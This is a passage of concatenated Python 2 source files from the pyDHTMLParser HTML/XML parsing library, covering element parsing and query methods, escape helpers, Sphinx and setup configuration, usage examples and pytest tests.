        Parse name of the tag.

        Result is saved to the :attr:`_tagname` property.
        """
        for el in self._element.split():
            el = el.replace("/", "").replace("<", "").replace(">", "")

            if el.strip():
                self._tagname = el.rstrip()
                return

    def _parseParams(self):
        """
        Parse parameters from their string HTML representation to dictionary.

        Result is saved to the :attr:`params` property.
        """
        # check if there are any parameters
        if " " not in self._element or "=" not in self._element:
            return

        # remove '<' & '>'
        params = self._element.strip()[1:-1].strip()

        # remove tagname
        offset = params.find(self.getTagName()) + len(self.getTagName())
        params = params[offset:].strip()

        # parser machine
        next_state = 0
        key = ""
        value = ""
        end_quote = ""
        buff = ["", ""]
        for c in params:
            if next_state == 0:      # key
                if c.strip() != "":  # safer than list space, tab and all
                    if c == "=":     # possible whitespaces in UTF
                        next_state = 1
                    else:
                        key += c

            elif next_state == 1:    # value decisioner
                if c.strip() != "":  # skip whitespaces
                    if c == "'" or c == '"':
                        next_state = 3
                        end_quote = c
                    else:
                        next_state = 2
                        value += c

            elif next_state == 2:    # one word parameter without quotes
                if c.strip() == "":
                    next_state = 0
                    self.params[key] = value
                    key = ""
                    value = ""
                else:
                    value += c

            elif next_state == 3:    # quoted string
                if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
                    next_state = 0
                    self.params[key] = unescape(value, end_quote)
                    key = ""
                    value = ""
                    end_quote = ""
                else:
                    value += c

            buff = _rotate_buff(buff)
            buff[0] = c

        if key:
            if end_quote and value.strip():
                self.params[key] = unescape(value, end_quote)
            else:
                self.params[key] = value

        if "/" in self.params.keys():
            del self.params["/"]
            self._isnonpairtag = True

    # * /Parsers **************************************************************

    # =========================================================================
    # = Getters ===============================================================
    # =========================================================================
    def isTag(self):
        """
        Returns:
            bool: True if the element is considered to be HTML tag.
        """
        return self._istag

    def isEndTag(self):
        """
        Returns:
            bool: True if the element is end tag (``</endtag>``).
        """
        return self._isendtag

    def isNonPairTag(self, isnonpair=None):
        """
        True if element is listed in nonpair tag table (``br`` for example) or
        if it ends with ``/>`` (``<hr />`` for example).

        You can also change state from pair to nonpair if you use this as
        setter.

        Args:
            isnonpair (bool, default None): If set, internal nonpair state is
                      changed.

        Returns:
            book: True if tag is nonpair.
        """
        if isnonpair is None:
            return self._isnonpairtag

        if not self._istag:
            return

        if isnonpair:
            self.endtag = None
            self.childs = []

        self._isnonpairtag = isnonpair

    def isPairTag(self):
        """
        Returns:
            bool: True if this is pair tag - ``<body> .. </body>`` for example.
        """
        if self.isComment() or self.isNonPairTag():
            return False

        if self.isEndTag():
            return True

        if self.isOpeningTag() and self.endtag:
            return True

        return False

    def isOpeningTag(self):
        """
        Detect whether this tag is opening or not.

        Returns:
            bool: True if it is opening.
        """
        if self.isTag() and \
           not self.isComment() and \
           not self.isEndTag() and \
           not self.isNonPairTag():
            return True

        return False

    def isEndTagTo(self, opener):
        """
        Args:
            opener (obj): :class:`HTMLElement` instance.

        Returns:
            bool: True, if this element is endtag to `opener`.
        """
        if not (self._isendtag and opener.isOpeningTag()):
            return False

        return self._tagname.lower() == opener.getTagName().lower()

    def isComment(self):
        """
        Returns:
            bool: True if this element is encapsulating HTML comment.
        """
        return self._iscomment

    def tagToString(self):
        """
        Get HTML element representation of the tag, but only the tag, not the
        :attr:`childs` or :attr:`endtag`.

        Returns:
            str: HTML representation.
        """
        def is_el_without_params():
            return not self.params and "=" not in self._element

        if not self.isTag() or self.isComment() or is_el_without_params():
            return self._element

        output = "<" + str(self._tagname)

        for key in self.params:
            output += " " + key + "=\"" + escape(self.params[key], '"') + "\""

        return output + " />" if self._isnonpairtag else output + ">"

    def getTagName(self):
        """
        Returns:
            str: Tag name or while element in case of normal text \
                 (``not isTag()``).
        """
        if not self._istag:
            return self._element

        return self._tagname

    # * /Getters **************************************************************
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from .shared import NONPAIR_TAGS
from .shared import _rotate_buff
from .shared import _closeElements

from .html_element import HTMLElement
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from .html_query import HTMLQuery
from .html_parser import _is_iterable


# Variables ===================================================================
# Functions & classes =========================================================
class HTMLElement(HTMLQuery):
    def __str__(self):
        return self.toString()

    def __repr__(self):
        return "HTMLElement(%s)" % repr(self.__str__())

    def toString(self):
        """
        Returns almost original string.

        If you want prettified string, try :meth:`.prettify`.

        Returns:
            str: Complete representation of the element with childs, endtag \
                 and so on.
        """
        output = ""

        if self.childs or self.isOpeningTag():
            output += self.tagToString()

            for c in self.childs:
                output += c.toString()

            if self.endtag is not None:
                output += self.endtag.tagToString()

        elif not self.isEndTag():
            output += self.tagToString()

        return output

    def getContent(self):
        """
        Returns:
            str: Content of tag (everything between `opener` and `endtag`).
        """
        if not self.isTag() and self._element:
            return self._element

        if not self.childs:
            return ""

        output = ""
        for c in self.childs:
            if not c.isEndTag():
                output += c.toString()

        if output.endswith("\n"):
            return output.rstrip()

        return output

    def prettify(self, depth=0, separator="  ", last=True, pre=False,
                 inline=False):
        """
        Same as :meth:`toString`, but returns prettified element with content.

        Note:
            This method is partially broken, and can sometimes create
            unexpected results.

        Returns:
            str: Prettified string.
        """
        output = ""

        if self.getTagName() != "" and self.tagToString().strip() == "":
            return ""

        # if not inside <pre> and not inline, shift tag to the right
        if not pre and not inline:
            output += (depth * separator)

        # for <pre> set 'pre' flag
        if self.getTagName().lower() == "pre" and self.isOpeningTag():
            pre = True
            separator = ""

        output += self.tagToString()

        # detect if inline - is_inline shows if inline was set by detection, or
        # as parameter
        is_inline = inline
        for c in self.childs:
            if not (c.isTag() or c.isComment()):
                if len(c.tagToString().strip()) != 0:
                    inline = True

        # don't shift if inside container (containers have blank tagname)
        original_depth = depth
        if self.getTagName() != "":
            if not pre and not inline:  # inside <pre> doesn't shift tags
                depth += 1
                if self.tagToString().strip() != "":
                    output += "\n"

        # prettify childs
        for e in self.childs:
            if not e.isEndTag():
                output += e.prettify(
                    depth,
                    last=False,
                    pre=pre,
                    inline=inline
                )

        # endtag
        if self.endtag is not None:
            if not pre and not inline:
                output += ((original_depth) * separator)

            output += self.endtag.tagToString().strip()

            if not is_inline:
                output += "\n"

        return output

    def replaceWith(self, el):
        """
        Replace value in this element with values from `el`.

        This useful when you don't want change all references to object.

        Args:
            el (obj): :class:`HTMLElement` instance.
        """
        self.childs = el.childs
        self.params = el.params
        self.endtag = el.endtag
        self.openertag = el.openertag

        self._tagname = el.getTagName()
        self._element = el.tagToString()

        self._istag = el.isTag()
        self._isendtag = el.isEndTag()
        self._iscomment = el.isComment()
        self._isnonpairtag = el.isNonPairTag()

    def removeChild(self, child, end_tag_too=True):
        """
        Remove subelement (`child`) specified by reference.

        Note:
            This can't be used for removing subelements by value! If you want
            to do such thing, try::

                for e in dom.find("value"):
                    dom.removeChild(e)

        Args:
            child (obj): :class:`HTMLElement` instance which will be removed
                         from this element.
            end_tag_too (bool, default True): Remove also `child` endtag.
        """
        # if there are multiple childs, remove them
        if _is_iterable(child):
            for x in child:
                self.removeChild(child=x, end_tag_too=end_tag_too)
            return

        if not self.childs:
            return

        end_tag = None
        if end_tag_too:
            end_tag = child.endtag

        for e in self.childs:
            if e != child:
                e.removeChild(child, end_tag_too)
                continue

            if end_tag_too and end_tag in self.childs:
                self.childs.remove(end_tag)

            self.childs.remove(e)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
# Variables ===================================================================
#: List of non-pair tags. Set this to blank list, if you wish to parse XML.
NONPAIR_TAGS = [
    "br",
    "hr",
    "img",
    "input",
    # "link",
    "meta",
    "spacer",
    "frame",
    "base"
]


# Functions ===================================================================
def _rotate_buff(buff):
    """
    Rotate buffer (for each ``buff[i] = buff[i-1]``).

    Example:
        assert _rotate_buff([1, 2, 3, 4]) == [4, 1, 2, 3]

    Args:
        buff (list): Buffer which will be rotated.

    Returns:
        list: Rotated buffer.
    """
    return [buff[-1]] + buff[:-1]


def _closeElements(childs, HTMLElement):
    """
    Create `endtags` to elements which looks like openers, but doesn't have
    proper :attr:`HTMLElement.endtag`.

    Args:
        childs (list): List of childs (:class:`HTMLElement` obj) - typically
               from :attr:`HTMLElement.childs` property.

    Returns:
        list: List of closed elements.
    """
    out = []

    # close all unclosed pair tags
    for e in childs:
        if not e.isTag():
            out.append(e)
            continue

        if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() \
           and e.endtag is None:
            e.childs = _closeElements(e.childs, HTMLElement)

            out.append(e)
            out.append(HTMLElement("</" + e.getTagName() + ">"))

            # join opener and endtag
            e.endtag = out[-1]
            out[-1].openertag = e
        else:
            out.append(e)

    return out
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from .html_parser import HTMLParser

from .html_parser import _is_str
from .html_parser import _is_dict
from .html_parser import _is_iterable


# Variables ===================================================================
# Functions & classes =========================================================
class HTMLQuery(HTMLParser):
    def containsParamSubset(self, params):
        """
        Test whether this element contains at least all `params`, or more.

        Args:
            params (dict/SpecialDict): Subset of parameters.

        Returns:
            bool: True if all `params` are contained in this element.
        """
        for key in params.keys():
            if key not in self.params:
                return False

            if params[key] != self.params[key]:
                return False

        return True

    def isAlmostEqual(self, tag_name, params=None, fn=None,
                      case_sensitive=False):
        """
        Compare element with given `tag_name`, `params` and/or by lambda
        function `fn`.

        Lambda function is same as in :meth:`find`.

        Args:
            tag_name (str): Compare just name of the element.
            params (dict, default None): Compare also parameters.
            fn (function, default None): Function which will be used for
                                         matching.
            case_sensitive (default False): Use case sensitive matching of the
                                            `tag_name`.

        Returns:
            bool: True if two elements are almost equal.
        """
        if isinstance(tag_name, self.__class__):
            return self.isAlmostEqual(
                tag_name.getTagName(),
                tag_name.params if tag_name.params else None
            )

        # search by lambda function
        if fn and not fn(self):
            return False

        # compare case sensitive?
        comparator = self._tagname  # we need to make self._tagname lower
        if not case_sensitive and tag_name:
            tag_name = tag_name.lower()
            comparator = comparator.lower()

        # compare tagname
        if tag_name and tag_name != comparator:
            return False

        # None params = don't use parameters to compare equality
        if params is None:
            return True

        # compare parameters
        if params == self.params:
            return True

        # test whether `params` dict is subset of self.params
        if not self.containsParamSubset(params):
            return False

        return True

    def find(self, tag_name, params=None, fn=None, case_sensitive=False):
        """
        Same as :meth:`findAll`, but without `endtags`.

        You can always get them from :attr:`endtag` property.
        """
        return [
            x for x in self.findAll(tag_name, params, fn, case_sensitive)
            if not x.isEndTag()
        ]

    def findB(self, tag_name, params=None, fn=None, case_sensitive=False):
        """
        Same as :meth:`findAllB`, but without `endtags`.

        You can always get them from :attr:`endtag` property.
        """
        return [
            x for x in self.findAllB(tag_name, params, fn, case_sensitive)
            if not x.isEndTag()
        ]

    def findAll(self, tag_name, params=None, fn=None, case_sensitive=False):
        """
        Search for elements by their parameters using `Depth-first algorithm
        <http://en.wikipedia.org/wiki/Depth-first_search>`_.

        Args:
            tag_name (str): Name of the tag you are looking for. Set to "" if
                            you wish to use only `fn` parameter.
            params (dict, default None): Parameters which have to be present
                   in tag to be considered matching.
            fn (function, default None): Use this function to match tags.
               Function expects one parameter which is HTMLElement instance.
            case_sensitive (bool, default False): Use case sensitive search.

        Returns:
            list: List of :class:`HTMLElement` instances matching your \
                  criteria.
        """
        output = []

        if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
            output.append(self)

        tmp = []
        for el in self.childs:
            tmp = el.findAll(tag_name, params, fn, case_sensitive)

            if tmp:
                output.extend(tmp)

        return output

    def findAllB(self, tag_name, params=None, fn=None, case_sensitive=False):
        """
        Simple search engine using `Breadth-first algorithm
        <http://en.wikipedia.org/wiki/Breadth-first_search>`_.

        Args:
            tag_name (str): Name of the tag you are looking for. Set to "" if
                            you wish to use only `fn` parameter.
            params (dict, default None): Parameters which have to be present
                   in tag to be considered matching.
            fn (function, default None): Use this function to match tags.
               Function expects one parameter which is HTMLElement instance.
            case_sensitive (bool, default False): Use case sensitive search.

        Returns:
            list: List of :class:`HTMLElement` instances matching your \
                  criteria.
        """
        output = []

        if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
            output.append(self)

        breadth_search = self.childs
        for el in breadth_search:
            if el.isAlmostEqual(tag_name, params, fn, case_sensitive):
                output.append(el)

            if el.childs:
                breadth_search.extend(el.childs)

        return output

    def wfind(self, tag_name, params=None, fn=None, case_sensitive=False):
        """
        This methods works same as :meth:`find`, but only in one level of the
        :attr:`childs`.

        This allows to chain :meth:`wfind` calls::

            >>> dom = dhtmlparser.parseString('''
            ... <root>
            ...     <some>
            ...         <something>
            ...             <xe id="wanted xe" />
            ...         </something>
            ...         <something>
            ...             asd
            ...         </something>
            ...         <xe id="another xe" />
            ...     </some>
            ...     <some>
            ...         else
            ...         <xe id="yet another xe" />
            ...     </some>
            ... </root>
            ... ''')
            >>> xe = dom.wfind("root").wfind("some").wfind("something").find("xe")
            >>> xe
            [<dhtmlparser.htmlelement.HTMLElement object at 0x8a979ac>]
            >>> str(xe[0])
            '<xe id="wanted xe" />'

        Args:
            tag_name (str): Name of the tag you are looking for. Set to "" if
                            you wish to use only `fn` parameter.
            params (dict, default None): Parameters which have to be present
                   in tag to be considered matching.
            fn (function, default None): Use this function to match tags.
               Function expects one parameter which is HTMLElement instance.
            case_sensitive (bool, default False): Use case sensitive search.

        Returns:
            obj: Blank HTMLElement with all matches in :attr:`childs` property.

        Note:
            Returned element also have set :attr:`_container` property to True.
        """
        childs = self.childs
        if self._container:  # container object
            childs = map(
                lambda x: x.childs,
                filter(lambda x: x.childs, self.childs)
            )
            childs = sum(childs, [])  # flattern the list

        el = self.__class__()  # HTMLElement()
        el._container = True
        for child in childs:
            if child.isEndTag():
                continue

            if child.isAlmostEqual(tag_name, params, fn, case_sensitive):
                el.childs.append(child)

        return el

    def match(self, *args, **kwargs):
        """
        :meth:`wfind` is nice function, but still kinda long to use, because
        you have to manually chain all calls together and in the end, you get
        :class:`HTMLElement` instance container.

        This function recursively calls :meth:`wfind` for you and in the end,
        you get list of matching elements::

            xe = dom.match("root", "some", "something", "xe")

        is alternative to::

            xe = dom.wfind("root").wfind("some").wfind("something").wfind("xe")

        You can use all arguments used in :meth:`wfind`::

            dom = dhtmlparser.parseString('''
                <root>
                    <div id="1">
                        <div id="5">
                            <xe id="wanted xe" />
                        </div>
                        <div id="10">
                            <xe id="another wanted xe" />
                        </div>
                        <xe id="another xe" />
                    </div>
                    <div id="2">
                        <div id="20">
                            <xe id="last wanted xe" />
                        </div>
                    </div>
                </root>
            ''')

            xe = dom.match(
                "root",
                {"tag_name": "div", "params": {"id": "1"}},
                ["div", {"id": "5"}],
                "xe"
            )

            assert len(xe) == 1
            assert xe[0].params["id"] == "wanted xe"

        Args:
            *args: List of :meth:`wfind` parameters.
            absolute (bool, default None): If true, first element will be
                     searched from the root of the DOM. If None,
                     :attr:`_container` attribute will be used to decide value
                     of this argument. If False, :meth:`find` call will be run
                     first to find first element, then :meth:`wfind` will be
                     used to progress to next arguments.

        Returns:
            list: List of matching elements (empty list if no matching element\
                  is found).
        """
        if not args:
            return self.childs

        # pop one argument from argument stack (tuples, so .pop() won't work)
        act = args[0]
        args = args[1:]

        # this is used to define relative/absolute root of the first element
        def wrap_find(*args, **kwargs):
            """
            Find wrapper, to allow .wfind() to be substituted witřh .find()
            call, which normally returns blank array instead of blank
            `container` element.
            """
            el = self.__class__()  # HTMLElement()
            el.childs = self.find(*args, **kwargs)
            return el

        # if absolute is not specified (ie - next recursive call), use
        # self._container, which is set to True by .wfind(), so next search
        # will be absolute from the given element
        absolute = kwargs.get("absolute", None)
        if absolute is None:
            absolute = self._container

        find_func = self.wfind if absolute else wrap_find

        result = None
        if _is_iterable(act):
            result = find_func(*act)
        elif _is_dict(act):
            result = find_func(**act)
        elif _is_str(act):
            result = find_func(act)
        else:
            raise KeyError(
                "Unknown parameter type '%s': %s" % (type(act), act)
            )

        if not result.childs:
            return []

        match = result.match(*args)

        # just to be sure return always blank array, when the match is
        # False/None and so on (it shouldn't be, but ..)
        return match if match else []
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
This module provides ability to quote and unquote strings using backslash
notation.
"""


# Functions & objects =========================================================
def unescape(inp, quote='"'):
    """
    Unescape `quote` in string `inp`.

    Example usage::

        >> unescape('hello \\"')
        'hello "'

    Args:
        inp (str): String in which `quote` will be unescaped.
        quote (char, default "): Specify which character will be unescaped.

    Returns:
        str: Unescaped string.
    """
    if len(inp) < 2:
        return inp

    output = ""
    unesc = False
    for act in inp:
        if act == quote and unesc:
            output = output[:-1]

        output += act

        if act == "\\":
            unesc = not unesc
        else:
            unesc = False

    return output


def escape(inp, quote='"'):
    """
    Escape `quote` in string `inp`.

    Example usage::

        >>> escape('hello "')
        'hello \\"'
        >>> escape('hello \\"')
        'hello \\\\"'

    Args:
        inp (str): String in which `quote` will be escaped.
        quote (char, default "): Specify which character will be escaped.

    Returns:
        str: Escaped string.
    """
    output = ""

    for c in inp:
        if c == quote:
            output += '\\'

        output += c

    return output
#! /usr/bin/env python3


def get_version(data):
    def all_same(s):
        return all(x == s[0] for x in s)

    def has_digit(s):
        return any(x.isdigit() for x in s)

    data = data.splitlines()
    return list(
        line for line, underline in zip(data, data[1:])
        if (len(line) == len(underline) and
            all_same(underline) and
            has_digit(line) and
            "." in line)
    )[0]
# -*- coding: utf-8 -*-
#
import os
import sys
import urllib
import os.path

sys.path.insert(0, os.path.abspath('../src'))

extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.todo',
    'sphinx.ext.coverage',
    'sphinx.ext.viewcode',
    'sphinxcontrib.napoleon'
]

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Document all methods in classes
autoclass_content = 'both'

# Sorting of items
autodoc_member_order = "bysource"

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = u'pyDHTMLParser'
copyright = u'Bystroushaak'

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGES.rst
    sys.path.insert(0, os.path.abspath('../'))
    from docs import get_version
    release = get_version(open("../CHANGES.rst").read())
except:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = filter(lambda x: "<title>" in x, fh.read().splitlines())
    release = release[0].split(":")[0].split()[1]

# The short X.Y version.
version = ".".join(release.split(".")[:2])

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = 'dhtmlparser'
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup
from setuptools import find_packages

from docs import get_version


# Variables ===================================================================
CHANGELOG = open('CHANGES.rst').read()
LONG_DESCRIPTION = "\n\n".join([
    open('README.rst').read(),
    CHANGELOG
])


# Actual setup definition =====================================================
setup(
    name='pyDHTMLParser',
    version=get_version(CHANGELOG),
    py_modules=['dhtmlparser'],

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    url='https://github.com/Bystroushaak/pyDHTMLParser',
    license='MIT',
    description='Python HTML/XML parser for easy web scraping.',

    long_description=LONG_DESCRIPTION,

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,

    classifiers=[
        "License :: OSI Approved :: MIT License",

        "Programming Language :: Python",
        "Programming Language :: Python :: 2.7",
        "Programming Language :: Python :: 3",

        "Topic :: Software Development :: Libraries",
        "Topic :: Software Development :: Libraries :: Python Modules",

        "Topic :: Text Processing :: Markup :: HTML",
        "Topic :: Text Processing :: Markup :: XML"
    ],

    extras_require={
        "test": [
            "pytest",
            "pytest-cov",
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    }
)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import dhtmlparser as d

s = """
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>
"""

dom = d.parseString(s)

print dom
print "---\nRemove all <object1>:\n---\n"

# remove all <object1>
for e in dom.find("object1"):
	dom.removeChild(e)


print dom.prettify()


#* Prints: *********************************************************************
"""
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>

---
Remove all <object1>:
---

<root>
  <object2>Second objects content</object2>
</root>
"""
#*******************************************************************************#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

# if inside container (or other tag), create endtag automatically
print HTMLElement([
	HTMLElement("<xe>")
])
"""
Writes:

<xe>
</xe>
"""

#-------------------------------------------------------------------------------

# if not inside container, elements are left unclosed 
print HTMLElement("<xe>")
"""
Writes only:

<xe>
"""#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
DHTMLParserPy example how to find every link in document.
"""

import urllib
import dhtmlparser

f = urllib.urlopen("http://google.com")
data = f.read()
f.close()

dom = dhtmlparser.parseString(data)

for link in dom.find("a"):
	if "href" in link.params:
		print link.params["href"]#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

foo = HTMLElement("<xe one='param'>")
baz = HTMLElement('<xe one="param">')

assert foo != baz # references are not the same
assert foo.isAlmostEqual(baz)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DHTMLParser DOM creation example.
from dhtmlparser import *

e = HTMLElement("root", [
		HTMLElement("item", {"param1":"1", "param2":"2"}, [
			HTMLElement("<crap>", [
				HTMLElement("hello parser!")
			]),
			HTMLElement("<another_crap/>", {"with" : "params"}),
			HTMLElement("<!-- comment -->")
		]),
		HTMLElement("<item />", {"blank" : "body"})
	])

print e.prettify()

"""
Writes:

<root>
  <item param2="2" param1="1">
    <crap>hello parser!</crap>
    <another_crap with="params" />
    <!-- comment -->
  </item>
  <item blank="body" />
</root>
"""
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import dhtmlparser
from dhtmlparser import first


# Variables ===================================================================
DOM = dhtmlparser.parseString("""
    <div id=first>
        First div.
        <div id=first.subdiv>
            Subdiv in first div.
        </div>
    </div>
    <div id=second>
        Second.
        <br />
        <!-- comment -->
    </div>
""")
div = DOM.find("div")[-1]
br = first(div.find("br"))


# Functions & objects =========================================================
def test_isTag():
    assert div.isTag()
    assert not first(div.childs).isTag()


def test_isEndTag():
    assert not div.isEndTag()
    assert not first(div.childs).isEndTag()

    assert div.endtag.isEndTag()


def test_isNonPairTag():
    assert not div.isNonPairTag()

    text = first(div.childs)
    assert text.getTagName().strip() == "Second."

    assert not text.isTag()
    assert not text.isNonPairTag()

    assert br.isNonPairTag()


def test_isComment():
    assert not div.isComment()
    assert not first(div.childs).isComment()

    assert div.childs[-2].isComment()


def test_isOpeningTag():
    assert div.isOpeningTag()
    assert not first(div.childs).isOpeningTag()

    assert not br.isOpeningTag()


def test_isEndTagTo():
    assert div.endtag.isEndTagTo(div)


def test_tagToString():
    assert div.tagToString() == '<div id="second">'
    assert first(div.childs).tagToString() == '\n        Second.\n        '

    assert br.tagToString() == "<br />"


def test_getTagName():
    assert div.getTagName() == 'div'
    assert first(div.childs).getTagName() == '\n        Second.\n        '

    assert br.getTagName() == "br"


def test_getContent():
    match = '\n        Second.\n        <br />\n        <!-- comment -->\n    '
    assert div.getContent() == match
    assert first(div.childs).getContent() == '\n        Second.\n        '

    assert br.getContent() == ""


def test_toString():
    assert div.toString().startswith(div.tagToString())
    assert first(div.childs).toString() == '\n        Second.\n        '
    assert br.toString() == "<br />"


def test_isNonPairTag_setter():
    div.isNonPairTag(True)

    assert div.toString() == '<div id="second" />'


def test_containsParamSubset():
    dom = dhtmlparser.parseString("<div id=x class=xex></div>")
    div = first(dom.find("div"))

    assert div.containsParamSubset({"id": "x"})
    assert div.containsParamSubset({"class": "xex"})
    assert div.containsParamSubset({"id": "x", "class": "xex"})
    assert not div.containsParamSubset({"asd": "bsd", "id": "x", "class": "xex"})
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import dhtmlparser
from dhtmlparser import first
from dhtmlparser.htmlelement import _rotate_buff
from dhtmlparser.htmlelement import _closeElements


# Functions & objects =========================================================
def test_rotate_buff():
    buff = [1, 2, 3, 4]

    buff = _rotate_buff(buff)
    assert buff == [4, 1, 2, 3]

    buff = _rotate_buff(buff)
    assert buff == [3, 4, 1, 2]

    buff = _rotate_buff(buff)
    assert buff == [2, 3, 4, 1]

    buff = _rotate_buff(buff)
    assert buff == [1, 2, 3, 4]


def test_closeElements():
    tag = dhtmlparser.HTMLElement("<div>")
    tag.endtag = dhtmlparser.HTMLElement("</div>")

    tag.childs = [
        dhtmlparser.HTMLElement("<xe>")
    ]

    xe = tag.find("xe")
    assert xe
    assert not xe[0].endtag

    tag.chids = _closeElements(tag.childs, dhtmlparser.HTMLElement)

    xe = tag.find("xe")
    assert xe
    assert first(xe).endtag
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

from dhtmlparser.specialdict import SpecialDict, _lower_if_str


# Variables ===================================================================
sd = SpecialDict([
    ("a", "b"),
    ("A", "B"),
    ("b", "c"),
    ("X", "Y"),
])


# Functions & objects =========================================================
def test_constructor():
    assert len(sd) == 3


def test_in_operator():
    assert "a" in sd
    assert "A" in sd
    assert "B" in sd
    assert "x" in sd


def test_getting_item():
    assert sd["a"] == "B"
    assert sd["A"] == "B"
    assert sd["B"] == "c"
    assert sd["x"] == "Y"

    assert list(sd) == ["A", "b", "X"]
    assert dict(sd)["A"] == "B"

    with pytest.raises(KeyError):
        dict(sd)["y"]

    with pytest.raises(KeyError):
        sd["y"]


def test_keys():
    assert sd.keys() == ["A", "b", "X"]


def test_iterkeys():
    assert list(sd.iterkeys()) == ["A", "b", "X"]


def test_items():
    assert sd.items() == [("A", "B"), ("b", "c"), ("X", "Y")]


def test_iteritems():
    assert list(sd.iteritems()) == [("A", "B"), ("b", "c"), ("X", "Y")]


def test_iteration():
    assert list(sd) == ["A", "b", "X"]


def test_setting_item():
    sd["C"] = 1

    assert sd["C"] == 1
    assert sd["c"] == 1

    sd["A"] = 1
    assert sd["a"] == 1
    assert sd["A"] == 1


def test_get_function():
    assert sd.get("A") == 1
    assert sd.get("a") == 1

    assert not sd.get("y")
    assert sd.get("y", "Nope") == "Nope"


def test_equality():
    first = SpecialDict({1: 2, 2: 3, 3: 4})
    second = SpecialDict({3: 4, 2: 3, 1: 2})

    assert first == second

    assert SpecialDict([("a", "b"), ("B", "a")]) == SpecialDict([("A", "b"), ("b", "a")])

    assert first == first
    assert SpecialDict({2: 3}) != SpecialDict({1: 2})
    assert SpecialDict({1: 2, 2: 3, 3: 4}) != "potato"


def test_lower_if_str():
    assert _lower_if_str("ASD") == "asd"
    assert _lower_if_str(u"ASD") == u"asd"
    assert _lower_if_str(123) == 123
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

import dhtmlparser
from dhtmlparser import first


# Functions & objects =========================================================
def test_raw_split():
    splitted = dhtmlparser._raw_split(
        """<html><tag params="true"></html>"""
    )

    assert splitted
    assert len(splitted) == 3
    assert splitted[0] == "<html>"
    assert splitted[1] == '<tag params="true">'
    assert splitted[2] == "</html>"


def test_raw_split_text():
    splitted = dhtmlparser._raw_split(
        """   <html>asd asd"as das</html>   """
    )

    assert splitted
    assert len(splitted) == 5
    assert splitted[0] == "   "
    assert splitted[1] == "<html>"
    assert splitted[2] == 'asd asd"as das'
    assert splitted[3] == "</html>"
    assert splitted[4] == "   "


def test_raw_split_parameters():
    splitted = dhtmlparser._raw_split(
        """<html><tag params="<html_tag>"></html>"""
    )

    assert splitted
    assert len(splitted) == 3
    assert splitted[0] == "<html>"
    assert splitted[1] == '<tag params="<html_tag>">'
    assert splitted[2] == "</html>"


def test_raw_split_parameters_quotes():
    splitted = dhtmlparser._raw_split(
        """<html><tag params="some \\"<quoted>\\" text"></html>"""
    )

    assert splitted
    assert len(splitted) == 3
    assert splitted[0] == "<html>"
    assert splitted[1] == '<tag params="some \\"<quoted>\\" text">'
    assert splitted[2] == "</html>"


def test_raw_split_comments():
    splitted = dhtmlparser._raw_split(
        """<html><!-- asd " asd" > asd --></html>"""
    )

    assert splitted
    assert len(splitted) == 3
    assert splitted[0] == "<html>"
    assert splitted[1] == '<!-- asd " asd" > asd -->'
    assert splitted[2] == "</html>"


def test_index_of_end_tag():
    tag_list = [
        dhtmlparser.HTMLElement("<h1>"),
        dhtmlparser.HTMLElement("<br />"),
        dhtmlparser.HTMLElement("</h1>"),
    ]

    assert dhtmlparser._indexOfEndTag(tag_list) == 2
    assert dhtmlparser._indexOfEndTag(tag_list[1:]) == 0
    assert dhtmlparser._indexOfEndTag(tag_list[2:]) == 0

    tag_list = [
        dhtmlparser.HTMLElement("<h1>"),
        dhtmlparser.HTMLElement("</h1>"),
        dhtmlparser.HTMLElement("</h1>"),
    ]

    assert dhtmlparser._indexOfEndTag(tag_list) == 1


def test_parse_dom():
    tag_list = [
        dhtmlparser.HTMLElement("<h1>"),
